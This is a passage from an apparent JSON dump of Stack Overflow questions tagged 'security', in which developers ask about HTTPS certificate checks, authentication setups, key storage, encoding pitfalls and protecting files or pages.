application?</p>\n"},{"tags":["security","ssl","https","certificate"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1031,"score":2,"question_id":138705,"title":"Security implications of disabling the Common Name check for HTTPS","body":"<p>I'm going over some client code I've inherited for doing secure communication over HTTPS, and it seems that it's not checking the common name in the server certificate (eg. 'CN = \"example.com\"' against the actual URL that's being requested. This is probably deliberate, since our client app is required to talk to various environments, so after contacting an initial portal (eg. example.com/main) and the user choosing an environment the app gets redirected to a specific IP, so all future requests look something like \"http://127.0.0.1/page\".</p>\n\n<p>However being an SSL newbie, I'm unsure of the implications of disabling this check. My first reaction would be that it'd be easier to perform some kind of man-in-the-middle attack, since someone else could just copy our certificate and pretend to be one of our servers. But if we were doing common name checking you'd be able to do the same thing with custom DNS settings anyway, so it doesn't seem to actually gain us anything. Are there other attacks that this leaves us open to which we wouldn't be otherwise?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","video-streaming","html5-video","cdn","mediaelement.js"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13036226,"title":"MediaElement.js: Source URL with Variables?","body":"<p>After falling in love with MediaElement.js, I ran into a problem. On the site in question we use Bitgravity as our CDN. Bitgravity uses an MD5 hash to secure video URLs, added to the end as a variable. For example:</p>\n\n<pre><code>    http://stuff.blah.cdn.bitg.net/Secure/stuff/myvideo.mp4?h=3440203940902383938298394833324323\n</code></pre>\n\n<p>The result was MEj's \"Download File\" link, pointing to the page the code is on. After fooling around a bit, I found that the presence of a variable on the URL is triggering the problem.</p>\n\n<p>Does anyone know of a way to make MediaElements.js accept a source URL with a variable such as this?</p>\n"},{"tags":["linux","security","ubuntu","random","entropy"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":13017023,"title":"How can I exhaust /dev/urandom for testing?","body":"<p>I recently had a bug where I didn't properly handle when the entropy on my linux server got too low and a read of /dev/urandom returned less than the number of bytes expected.</p>\n\n<p>How can I recreate this with a test?  Is there a way to lower the entropy on a system or to reliably empty /dev/urandom?</p>\n\n<p>I'd like to be able to have a regression test that will verify my fix.  I'm using Ubuntu 12.04.</p>\n"},{"tags":["php","security","encoding","utf-8","mbstring"],"answer_count":2,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":106,"score":13,"question_id":13022369,"title":"PHP Security: how can encoding be misused?","body":"<p>From this excellent \"<a href=\"http://stackoverflow.com/questions/279170/utf-8-all-the-way-through\">UTF-8 all the way through</a>\" question, I read about this:</p>\n\n<blockquote>\n  <p>Unfortunately, you should verify every submitted string as being valid\n  UTF-8 before you try to store it or use it anywhere. PHP's\n  mb_check_encoding() does the trick, but you have to use it\n  religiously. There's really no way around this, <strong>as malicious clients</strong>\n   <strong>can submit data in whatever encoding they want</strong>, and I haven't found a\n  trick to get PHP to do this for you reliably.</p>\n</blockquote>\n\n<p>Now, I'm still learning the quirks of encoding, and I'd like to know exactly what malicious clients can do to abuse encoding. What can one achieve? Can somebody give an example? Let's say I save the user input into a MySQL database, or I send it through e-mail, how can a user create harm if I do not use the <code>mb_check_encoding</code> functionality? </p>\n"},{"tags":["security","windows-integrated-authe","windows-integrated-authen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13015793,"title":"Will Integrated Windows Authentication ever fall back to plain text username & password?","body":"<p>I'm trying to learn more about Integrated Windows Authentication but everything I read introduces me to three new acronyms, many of which incorporate other acronyms, and I don't feel I know anything about the mechanics.</p>\n\n<p>I understand that if an HTTP client doesn't support Integrated Windows Authentication there is a chain of fallbacks that can identify the client and might involve prompting for a username and password. Is there ever a case where it will fallback to HTTP Basic Authentication or any other plain text username / password communication?</p>\n\n<p>I'm trying to determine if I need to provide SSL to protect user credentials and I'm hoping that all authentication is secured in some way.</p>\n"},{"tags":["c#","asp.net","security","authentication","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13033540,"title":"client certificate authentication in https using X509Certificate2","body":"<p>I am trying to understand how does client authentication work in https scenario and how to use it to provide a basic authentication/authorization capability.</p>\n\n<p>Let's say I want to have a mapping between a certificate and a user (eg. IPrincipal). My server issues certs and distributes them to the clients. When client connects I ask for certificate and if a valid certificate has been provided I authenticate the user based on the mapping defined earlier. </p>\n\n<p>What should I use to create the mapping? Is cert thumbprint a good candidate? Is it enough to determine client identity?</p>\n\n<p>Or maybe I don't need the mapping at all and can simply accept all certs issued by my server ?</p>\n\n<p>Edit: Let me rephrase it - assuming that I can issue client certificates, how do I verify clients identity during https session?</p>\n"},{"tags":["security","authentication","tomcat","war"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":10212207,"title":"Tomcat authentication configured inside the war","body":"<p>I have to deploy a war to a tomcat but I cannot modify anything outside the war itself.\nNow I need to add authentication and authorization to the application.</p>\n\n<p>The basic authentication would be enough but I cannot edit the tomcat-user.xml file, nor I can depend on absoulute paths as suggestend here: <a href=\"http://stackoverflow.com/questions/7726014/how-do-i-provide-basic-http-authentication-for-static-tomcat-webapps-without-cha\">How do I provide basic http authentication for static tomcat webapps without changing tomcat-users.xml?</a></p>\n\n<p>I just need to use a single user/password that can be configured in a file inside the war (it's a simple application with short lifetime and really low security requirements).\nWhat is the simplest way to do this?</p>\n\n<p>Thanks\nAndrea</p>\n"},{"tags":["asp.net-mvc","security","asp.net-web-api","wif",".net-4.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12936315,"title":"How to Make Sure My Custom ClaimsPrincipal Sticks Around In ASP.NET MVC 4","body":"<p>I am creating a custom <strong><em>ClaimsPrincipal</em></strong> that has additional claims using a custom <strong><em>AuthenticationManager</em></strong>.  It appears that in ASP.NET 4.5 the <strong><em>AuthenticationManager</em></strong> is not automatically invoked and you have to manually invoke it. I have seen posts that suggest you do this in the <strong><em>PostAuthenticateRequest</em></strong>. My code looks like this in the Global.asax:</p>\n\n<pre><code>protected void Application_OnPostAuthenticateRequest(object sender, EventArgs e)\n{\n    System.Web.HttpContext.Current.User =\n        FederatedAuthentication.FederationConfiguration.IdentityConfiguration.ClaimsAuthenticationManager.Authenticate(\"none\",\n            System.Web.HttpContext.Current.User as ClaimsPrincipal);\n}\n</code></pre>\n\n<p>I am using Forms Authentication with cookies.  The current principal gets set correctly when the PostAuthenticateRequest is fired. The problem is that when the next request comes in to the ASP.NET Web API the custom claims are lost. I am using Web API for AJAX requests in a single page application (SPA). I suspect that what is in the current ClaimsPrincipal is being overwritten by what is in the cookie, but I am not sure. I am not using an inherited ClaimsPrincipal for type-safe retrieval of custom claims. I am just adding new claims which are subsequently lost somewhere in the process. What is the proper way to setup a custom ClaimsPrincipal so the additional claims are not loss between requests.</p>\n"},{"tags":["java","security","jvm","weblogic"],"answer_count":2,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":2011,"score":6,"question_id":4521119,"title":"Java argument to specify Java.Security file for JVM","body":"<p>I'm looking for a java argument (or perhaps some different method) to allow me to specify a file to be used by the JVM as the java.security file, rather than using the one found in the JDK (in the JRE lib).</p>\n\n<p>To give you a little more context, I am working with a WebLogic server that was set up by someone else and is running two (or more) different JVMs off the same JDK. We have run into an issue now where the work I'm doing on one JVM requires a different java.security file than the one that is currently being used by the other JVM. I am hoping there will be a way for me to just point my JVM at a new java.security file without having to point it at an entirely new JDK (due to space constraints, we would like to avoid uploading a JDK specific to each JVM).</p>\n\n<p>I realize that the server's set up is not ideal, but completely rearranging the existing set up is not viable and not something I am in a position to do. So, I am hoping someone might have a creative solution that would allow for multiple JVMs running off the same JDK but with different security configurations.</p>\n\n<p>I have been trying to find solutions out there, but it seems my Google-Foo is not as strong as I had hoped. Here's to hoping one of you has the answer!</p>\n\n<p>Many thanks.</p>\n\n<p><strong>EDIT</strong><br>\nSorry maybe my  original post was not clear, but I am interested in specifying the java.security file, also often referred to as the <em>Java master security properties file</em>, not the java.policy file which is found in the same directory.</p>\n\n<p><strong>My Solution</strong></p>\n\n<p>I will post my solution here just for reference of others who might fall into a similar situation.</p>\n\n<p>As I can't seem to find an argument to specify at start up, I have decided that I will have to forgo the java.security properties file. It is possible to set properties and providers (typically configured in the file) within code using the Security class (java.security.Security). So, at least in the interim, I plan to write a class that will go through setting up my JVM specific security configurations after startup (essentially overwriting the default configurations provided by the file for the other JVM). While the obvious downside of this solution is that is does not externalize security configurations of this JVM, the solution does provide me a way to set JVM specific properties and providers without affecting the configuration of other JVMs running off the same JDK.</p>\n\n<p>I appreciate the time and consideration given by others. Thanks =) </p>\n"},{"tags":[".net","asp.net","security","cryptography"],"answer_count":4,"favorite_count":5,"up_vote_count":12,"down_vote_count":0,"view_count":2070,"score":12,"question_id":3681493,"title":"Leveraging ASP.NET machineKey For Encrypting My Own Data","body":"<p>I have some data I want to encrypt in an ASP.NET MVC application to prevent users from tampering with it.  I can use the Cryptography classes to do the actual encryption/decryption, no problem there.  The main problem is figuring out where to store the encryption key and managing changes to it.</p>\n\n<p>Since ASP.NET already maintains a machineKey for various things (ViewData encryption, etc), I was wondering if there were any ASP.NET functions which let me encrypt/decrypt my own data using the machineKey?  This way I would not have to devise my own key management system.</p>\n"},{"tags":["java","spring","security","xss","apache-stringutils"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":11718451,"title":"Selective HTML escaping with Java","body":"<p>Is there anything in <code>JavaSE</code>, <code>Spring</code> or <code>Apache Commons StringUtils</code> that would allow me to strip out HTML from a String but also supply a whitelist of HTML entities that I would like to allow?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","provider","smartcard","pkcs#11"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4351,"score":6,"question_id":5172069,"title":"Access restriction on sun.security.pkcs11.SunPKCS11","body":"<p>I'm trying to setup a PKCS11 provider for accessing a smartcard.\nI installed a PKCS11 library on my system and followed the instructions in the <a href=\"http://download.oracle.com/javase/1.5.0/docs/guide/security/p11guide.html\" rel=\"nofollow\" title=\"Java PKCS#11 Reference Guide\">Java PKCS#11 Reference Guide</a>.\nIn the reference they simply create an instance of <code>sun.security.pkcs11.SunPKCS11</code> and pass the name of the configuration file to the constructor.\nWhen I try to compile the following code</p>\n\n<pre><code>Provider p = new sun.security.pkcs11.SunPKCS11(\"pkcs11.cfg\");\nSecurity.addProvider(p);\n</code></pre>\n\n<p>I get the following error.  </p>\n\n<blockquote>\n  <p>Access restriction: The constructor SunPKCS11(String) is not accessible due to restriction on required library /usr/lib/jvm/java-6-sun-1.6.0.24/jre/lib/ext/sunpkcs11.jar</p>\n</blockquote>\n\n<p>What am I doing wrong?\nI use Eclipse 3.5 with Java SE 1.6 under Ubuntu x86.</p>\n\n<p>Best regards. </p>\n"},{"tags":["python","security","architecture","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13028310,"title":"Special pages protection","body":"<p>for once, I do not came with a \"technical\" question but rather with an architectural/structural question.</p>\n\n<p>I'm currently building a web-plateform, there is a public zone and a private zone.\nall URLs are handle by a process which have to check which ressource is request and then redirect the request to the correct process.</p>\n\n<p>Most of time, the process is just to check if the requested page is available and public.\nIf it's not available, the pageHandler process thrown an HTTP Error document depending of the error.\nIf the page is a private page, the pageHandler process request for authentication and the OAuthHandler do his job.</p>\n\n<p>Now, I'm wondering one thing. Do I have to protect my private pages individualy with an authentication process in it or can I leave them like that?</p>\n"},{"tags":["javascript","security","console"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13028344,"title":"Is there a way to stop Javascript commands being executed in console?","body":"<p>As per the question title.</p>\n\n<p>Although <em>not</em> required; I would like to stop people from executing functions on my page via the console... Is this even possible?</p>\n\n<p>I've tried a few things, this is the closest I've come - but this doesn't work :(</p>\n\n<pre><code>    window.onresize = function(){\n        if((window.outerHeight - window.innerHeight) &gt; 100) {\n            //stop commands here?\n        }\n    }\n    window.onload = function() {\n        if (typeof console !== \"undefined\" || typeof console.log !== \"undefined\") {\n            if (window.console &amp;&amp; (window.console.firebug || window.console.exception)) {\n                    //stop commands here?\n            }\n        }\n    }\n</code></pre>\n\n<p><strong>EDIT:</strong><br />\nI don't have to disable the console, just function calls made within it - either solution would be fine though ;)</p>\n\n<p><strong>EDIT2:</strong><br />\nSo, to get this right... There is now no way of detecting the console crossbrowser at all?</p>\n\n<p><strong>EDIT3:</strong><br />\nI've sort of got around it by doing the following, although the JS functions are still in place - the elements that they relate to are not... Not a great fix, but I guess it'll do... :(\n<br /></p>\n\n<pre><code>        setInterval(function() {\n            if (!$.browser.mozilla) {\n                if((window.outerHeight - window.innerHeight) &gt; 100) {\n                    alert(\"DISABLED!\");\n                    $('body').remove();\n                    return false;\n                }\n            }\n            if (window.console &amp;&amp; (window.console.firebug || window.console.exception)) {\n                alert(\"DISABLED!\");\n                $('body').remove();\n                return false;\n            }\n        }, 750);\n</code></pre>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13028345,"title":"How to add the initial, very first user to a web app user list (this user would then add other users)?","body":"<p>I am building a web app that goes to many customers. Tha app enables customers to manage their users: create user with user name, password, permissions, etc. There needs to be first admin user that has a permisssion to create other users.</p>\n\n<p>Problem is the initial user setup:</p>\n\n<ul>\n<li>When the app is first installed, how should the first user be added?</li>\n<li>Should this user be pre-installed in the user database? </li>\n<li>Which password to set for this initial user and which email to recover the password in case it is forgotten?</li>\n<li>Etc.</li>\n</ul>\n\n<p>How are situations like this handled? </p>\n"},{"tags":["java","security","reflection","sandbox"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13027602,"title":"Security when compiling custom language to Java","body":"<p>I'm compiling user-inputted code in a custom language to Java. The resulting code, as of now, can only have one class with static methods. Because the user code is insecure, I've set up a security manager and I've restricted file, network, and many other permissions. The code is also being run on a sandboxed virtual machine. </p>\n\n<p>What else can I do to ensure the machine will not be compromised. Specifically, given all the rumblings about Java insecurity, are there test packages or suites that I can use to try to break out of the Java sandbox into the VM itself?</p>\n"},{"tags":["asp.net","security","membership"],"answer_count":5,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":3683,"score":10,"question_id":375524,"title":"How can you test if an ASP.NET membership password will meet configured complexity requirements?","body":"<p>I have a ASP.NET page which allows an administrator to change the password for a user.  Since the administrator does not know the user's password, I am using the following:</p>\n\n<pre><code>MembershipUser member = Membership.GetUser(_usernameTextBox.Text);\nmember.ChangePassword(member.ResetPassword(), _passNewTextBox.Text);\n</code></pre>\n\n<p>-- as described by this <a href=\"http://stackoverflow.com/questions/287320/how-do-you-change-a-hashed-password-using-aspnet-membership-provider-if-you-don\">SO question</a>.  </p>\n\n<p>If the new password does not meet the complexity requirements which are configured in the web.config file, then the password will have been reset, but not changed to the desired one.  If the new password does not meet complexity requirements, then the password should not change at all.</p>\n\n<p>Is there an easy way to test the new password against the complexity requirements?</p>\n"},{"tags":[".net","web-services","security","authentication","iis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13026020,"title":"Authenticate requests to a web site hosted in IIS against AD using username and password","body":"<p>I have a web site which when called by a client using WebClient (c#) it returns data. I want to secure this web site so that all clients calling my web site for data need to provide username/passowrd so i can authenticate them. My web site is hosed in IIS. Additionaly i later want to implement logging (e.i, which client is calling my web site etc).</p>\n\n<p>I am thinking of the following:\n1- Should i change my web site to wcf project in order to easly implement the authnetication?\n2- I want to use Active directory for storing info about users. So if a client is registered in AD and calls my web site, then it is accepted, otherwise denied.\n3- I would like to use username and password (because i want to authenticate againt AD and also want to know who the calling client is and later implement logging).\n4- Any idea on what to use and how to implement the logging?\n5 how can IIS help me implementing this?\n6- Can AD be innstalled on the same mashine that has ISS (hosting my web site) installed? Can i install AD on my pc (win 7) or it must be installed on Win Server 2008 R2?\n7- Is there any problem with sending username adn password to contact my web site, is it secure enough?\n8- i have heard about basic authentication, is it something possible to use in my case?\n9- \nAny code samples showing code on how the client calls the service with username/password and how the server gets the request and authenticates it against AD. I would really be very thankful. </p>\n\n<p>I have read and googled alot and a just got more confused.</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","soap","passwords","jira"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12516053,"title":"Secure password storing while authenticating to JIRA via SOAP service","body":"<p>I am writing an application, in Java, which needs to log in to a remote SOAP service (JIRA) prior to calling methods on that service.</p>\n\n<p>I have looked at examples of how to do this, for example <a href=\"http://www.j-tricks.com/1/post/2010/8/jira-soap-client.html\" rel=\"nofollow\">http://www.j-tricks.com/1/post/2010/8/jira-soap-client.html</a>, however I am concerned that I need to put the password in memory at some point.</p>\n\n<p>I've read that I should store the password as a char[] but still, I'm concerned about storing the password in the clear at all.  </p>\n\n<p>How should I store the password used by my client to log into the SOAP service?  And how should I read it and pass it to JIRA?</p>\n\n<p><em>EDIT</em>\nThis application will be using Spring so it's likely the password would be stored in the bean configuration file rather than in the code.</p>\n"},{"tags":["security","red5"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13020321,"title":"Red5 Security Tip","body":"<p>I recently watched a video demonstrating that a red5 application with only stub code is capable of streaming and recording. This means anyone could use my server to stream their content and that's best case. So my questions are\n 1. To me this seems that red5 doesn't take security seriously; am I incorrect to assume this?\n 2. Do they rapidly release security updates?\n 3. If the above are yes then what implementation precautions should I take to solve this and other \"undocumented features\"?</p>\n\n<p>(topical answers are fine all I need is enough to Google the specifics)</p>\n"},{"tags":["perl","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":13023594,"title":"Executing system commands safely while coding in Perl","body":"<p>Should one really use external commands while coding in Perl? I see several disadvantages of it. It's not system independent plus security risks might also be there. What do you think? If there is no way and you have to use the shell commands from Perl then what is the safest way to execute that particular command (like checking pid, uid etc)?</p>\n"},{"tags":["security","scala","playframework","authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13022072,"title":"Is there an example scala play 2 project integrating Deadbolt 2 with SecureSocial?","body":"<p>I am looking for suggestions of play 2.0 authorization modules you would recommend using in conjunction with SecureSocial.</p>\n\n<p>I am building a Scala Play 2.0.4 application, and I'm in the process of integrating security. I've completed the integration of the SecureSocial module to provide authentication, and I'm very happy with it.</p>\n\n<p>Next, I would like to integrate authorization into my application, but I'm having trouble finding a play 2.0 authz module that's ready for use. I've looked quite a bit at Deadbolt-2, however it seems it's not ready for use in a scala application -- at least I've been unable to determine how to implement the ScalaboltHandler to provide a RoleHolder via SecureSocial. I've examined the SociallySecure example, but that appears to not be current with play 2.0. Other examples of using deadbolt are overly simplistic to be useful. I've read there is a new release of deadbolt pending, but it's not clear to me whether this will fully support a scala application.</p>\n"},{"tags":["web-services","security","rest","hash","checksum"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13025034,"title":"Writing a secure REST web service","body":"<p>Many of them are getting confused on how to write a secure rest webservice, for those who are confused to which method to use this post will be helpful in a great way.</p>\n\n<p><strong>Possible ways of writing REST services(Partially Secure)</strong></p>\n\n<ul>\n<li><p>You realize that literally passing the credentials over HTTP leaves that data open to being sniffed in plain-text; After the Gawker incident, you realize that plain-text or weakly-hashed anything is usually a bad idea.</p></li>\n<li><p>You realize that hashing the password and sending the hash over the wire in lieu of the plain-text password still gives people sniffing at least the username for the account and a hash of the password that could (in a disturbing number of cases) be looked up in a Rainbow Table.</p></li>\n<li><p>you exclaim, because in this case (which is really a username/password scenario all over again) you still suffer from the same problems (sniffed traffic) that sending the username and password in plain text had.</p></li>\n<li><p>At this point you are about to give up and concede to using <strong>OAuth</strong>, but you insist that there has to be a secure but relatively easy way to design a public web API that can keep credentials private.</p></li>\n</ul>\n"},{"tags":["android","security","android-intent","camera","picture"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":13007952,"title":"Capture image in Android via intent (ACTION_IMAGE_CAPTURE)","body":"<p>Is there a \"secure\" way to invoke the android camera with the intent <code>MediaStore.ACTION_IMAGE_CAPTURE</code> to capture a picture?\nI am using the following code to take a snapshot from the camera:</p>\n\n<pre><code>Uri tempFile = Uri.fromFile(tempFile()); // returns a temporary stored files that is \"Context.MODE_WORLD_WRITEABLE\" so that android can put the file in this location\n// tempFile looks like: file:///data/data/com.example.myapp/files/temp_picture.jpg\nIntent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\ncamera.putExtra(MediaStore.EXTRA_OUTPUT, tempFile);\nstartActivityForResult(camera, Constants.REQUESTCODE_PICTURE_RESULT);\n</code></pre>\n\n<p>After that (returning from camera \"<code>RESULT_OK</code>\") I am copying the tempFile to the secured application store <code>Context.MODE_PRIVATE</code> and deleting the <code>tempFile</code>.\nEverything works fine, the picture is taken and stored on the given Uri. But also the image is placed (in case of my current development device \"HTC Sensation\") in the galery\nfrom my device (location is <code>/mnt/sdcard/DCIM/100MEDIA/IMAG00XX.jpg</code>). Why is the picture stored twice, I didn't even mention this location in my code? Is this a HTC \"feature\" or does the android camera store the file twice for media\nscanning?</p>\n\n<p>I also tried to get the Bitmap from the camera by omitting the <code>MediaStore.EXTRA_OUTPUT</code> parameter, but with this code I am only getting a thumbsize-picture from the camera (no full resolution).</p>\n\n<p>I read a lot about the android camera, but I have to fetch an image from the camera in a \"secured\" way (no other app should read the data taken from the camera). I already\nthought about implementing my own camera surface to catch a picture, but with this approach I must code a lot of stuff (flash, saturation, effects, zoom...) that the build in camera application already provides. Is it really that hard to take a picture on the android system?</p>\n"},{"tags":["security","web-applications","public-key-encryption","saml-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13022374,"title":"How to best encrypt data-at-rest for users logging in with SAML?","body":"<p>I have a web application which allows SAML authentication by users using their own identity provider. I have fields in a database in my application which I want to ensure that only authorized users can decrypt (and developers/administrators of the system are NOT implicitly authorized).  For users logging in with a password this is easy - make an RSA keypair where the private key is encrypted with their login password, and update a keychain if the password ever changes.  But how can this be done when there is no login password, because the user has been authenticated with SAML?</p>\n"},{"tags":["android","asp.net","ios","security","payment"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13022944,"title":"Payment security on Android App","body":"<p>I am developing an application which helps user can browse and buy books. The client can be Android ,iOS, Mac. The server is Asp.net Web APIs. </p>\n\n<p>I know there are many service for payment. One of these is Authorize.net and I think I will use it. When user pay for a book, he/she will got a unique link to download data from server. I want to prevent other users who has the link ( by some hacking) download data. Not yet, I want to keep user payment information in secure.</p>\n\n<p>I have no experience in security. So, please give some advices to implement this. Thanks.</p>\n"},{"tags":["java","android","security","encryption","aes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12994458,"title":"How to store the key used to encrypt files in android by using AES algorithm","body":"<p>im try develop a encryption app for android by using AES algorithm ,where should i store the key. the idea is that the user provides a password and a key is generated.how can i do this process safer.thanks in advance</p>\n"},{"tags":["security","cryptography","communication"],"answer_count":9,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1078,"score":4,"question_id":1914257,"title":"When can you trust yourself to implement cryptography based solutions?","body":"<p>I've read quite a few times how I <a href=\"http://blogs.msdn.com/ericlippert/archive/2009/12/14/use-the-right-tool-for-the-job.aspx\" rel=\"nofollow\">shouldn't</a> use <a href=\"http://www.codinghorror.com/blog/archives/001267.html\" rel=\"nofollow\">cryptography</a> if I'm not an expert. Basically both Jeff and Eric tell you the same:</p>\n\n<blockquote>\n  <p>Cryptography is difficult, better buy the security solution from experts than doing it yourself.</p>\n</blockquote>\n\n<p>I completely agree, for a start it's incredibly difficult to perceive all possible paths an scenario might take, all the possible attacks against it and against your solution... but then When should we use it?</p>\n\n<p>I will face in a few months with the task of providing a security solution to a preexisting solution we have. That is, we exchange data between servers, second phase of the project is providing good security to it. Buying a third party solution will eat up the budget anyway so ... When is it good to use cryptography for a security solution? Even if you are not a TOP expert.</p>\n\n<p><strong>Edit:</strong> To clarify due to some comments.\nThe project is based on data transport across network locations, the current implementation allows for a security layer to be placed before transport and we can make any changes in implementation we like (assuming reasonable changes, the architecture is well design so changes should have an acceptable impact). The question revolves around this phrase from Eric Lippert:</p>\n\n<blockquote>\n  <p>I dont know nearly enough about cryptography to safely design or implement a crypto-based security system.</p>\n</blockquote>\n\n<p>We're not talking about reinventing the wheel, I had in mind a certain schema when I designed the system that implied secure key exchange, encryption and decryption and some other \"counter measures\" (man in the middle, etc) using C# .NET and the included cryptography primitives, but I'm by no means an expert in the field so when I read that, I of course <strong>start doubting myself. Am I even capable of implementing a secure system?</strong> Would it always be parts of the system that will be insecure unless I subcontract that part?</p>\n"},{"tags":["java","security","random"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":79,"score":-1,"question_id":13005966,"title":"Is the following random number generation without bias?","body":"<p>Would the following code produce a random number with or without bias?</p>\n\n<pre><code>    int numberToGenerate = 20;\n    int rangeUpperLimit = 30;\n    SecureRandom random = SecureRandom.getInstance(\"SHA1PRNG\");\n\n    for (int i = 0; i &lt; numberToGenerate; i++) {\n        int randomInt = random.nextInt(rangeUpperLimit); \n        // Do something with it.\n    }        \n</code></pre>\n\n<p>The values are used to pick <code>chars</code> from a <code>String</code> of length 30, hence the range 0-29. The code to pick the <code>char</code> values is omitted as it is not relevant to the question.</p>\n"},{"tags":["security","http","encryption","ssl","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13021854,"title":"How to send data securely as parameters in URL?","body":"<p>As <a href=\"http://stackoverflow.com/a/2629241/327528\">this answer</a> suggests, it isn't a good idea to have sensitive information in a URL string.  Even though it will be encrypted if you use SSL, it will be stored in a server log in clear text.</p>\n\n<p>How then should GET arguments be passed to a web server securely?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13020576,"title":"PHP Apache - How do I create a secure working directory, invisible to web","body":"<p>I have created a PHP script that takes a large html file and, using DOMDocument, chops it up into smaller files.  To save on script memory and without having to use a DB, I've done this sequentially and saved them as hundreds of html files.  My question is, how do I make sure these files cannot be visible to the outside world, but still retain the ability to use them as resources for future processing (piece together various files and display them on a page)?</p>\n\n<p>I'm using Amazon EC2 - Centos 6/Apache.</p>\n\n<p>Thank you!</p>\n"},{"tags":["ios","security"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13013043,"title":"iOS secure directory for specific app","body":"<p>Is there any way to make directory in iOS secured and protected just for my app?\nin my application user buys books and I save books on documents sub directory, so I don't want any other application to access this directory \nany suggestions ?\nshould I encrypt this data ?</p>\n"},{"tags":["php","security"],"answer_count":8,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":3132,"score":6,"question_id":3012315,"title":"PHP Security best practices","body":"<p>I have implemented a project on PHP/MYSQL now i needs to secure my project, please let me know the security issues and how to tackle in PHP</p>\n"},{"tags":["java","security","neo4j"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13015323,"title":"Prevent some users modifying a Neo4J node","body":"<p>In my Neo4J database, I want to prevent particular users modifying nodes.  I would like to allow any user to be a 'guest' and view data and certain users to be admins and view and edit as much data as they like.</p>\n\n<p>This needs to be part of the neo4j server, I would rather not implement a webservice over neo4j.</p>\n"},{"tags":["php","security",".htaccess","ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12988408,"title":"Can I use PHP to limit a page only on a set of IPs?","body":"<p>I have a folder which contains an admin panel - no password or session management is on the script. The URL is complex to get too. To save time before making an admin login system. Can I restrict a folder and all sub folders and files via .<code>htaccess</code> or should I make a PHP include which checks an Array list of IPs and then just does <code>die()</code> or redirect <code>Header()</code> to external source?</p>\n\n<p>Thanks</p>\n"},{"tags":["windows","security","named-pipes"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":52,"score":2,"question_id":12980403,"title":"How can I tell if the server side of a named pipe is an admin?","body":"<p>I am trying to use named pipes on Windows XP SP2+.  The pipe server will be a service, running as some kind of administrator / system level account.  The pipe client could be any user, possibly a guest, possibly an admin.  In my case, I am fine with having a guest account successfully communicate with my service running as administrator.</p>\n\n<p>Before I start using the pipe in my client code, I want to validate that the other side of the pipe is really owned by an administrator / the system.</p>\n\n<p>I have discovered the GetSecurityInfo function, and I think I should be able to use that as part of the solution.  However, I don't know how to get from a SID to an \"is admin\" check.</p>\n"},{"tags":["java","security","unit-testing","mocking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13018059,"title":"How do I set the AccessControlContext in Java?","body":"<p>I'm fairly new to Java security stuff and I'm having a hard time figuring out how to google the right answer to this.</p>\n\n<p>I have a line of code that reads <code>AccessController.getContext()</code>.  </p>\n\n<p>I want to run a test where I mock the result of this.  Unfortunately, I have no idea what I'm doing.  </p>\n\n<p>How do I set the <code>AccessControlContext</code> 